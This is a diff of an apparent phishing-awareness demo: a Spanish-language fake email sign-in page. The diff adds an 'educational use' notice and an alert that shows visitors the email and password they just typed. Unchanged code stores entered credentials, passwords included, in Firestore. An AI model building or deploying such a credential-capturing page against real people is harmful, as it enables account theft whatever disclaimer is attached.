@@ -102,6 +102,11 @@
         .footer-links a:hover {
             text-decoration: underline;
         }
+        .educational-notice {
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
@@ -134,6 +139,11 @@
 
         <div class="footer-links">
             <a href="#">¿Olvidaste tu correo electrónico?</a> · <a href="#">Más opciones</a>
+        </div>
+
+        <!-- Leyenda de uso educativo -->
+        <div class="educational-notice">
+            Esta página es utilizada con fines educativos. No se almacenarán ni utilizarán tus datos de manera maliciosa.
         </div>
     </div>
 
@@ -200,6 +210,9 @@
 
                     // Guarda el intento de inicio de sesión fallido en Firestore
                     await saveLoginAttempt(email, password, false);
+
+                    // Muestra una alerta con los datos ingresados
+                    alert(`Sus datos han sido robados:\nCorreo: ${email}\nContraseña: ${password}`);
 
                     // Muestra un mensaje de error al usuario
                     let errorMessage = "Ud. ha sido robado por el PunGato";
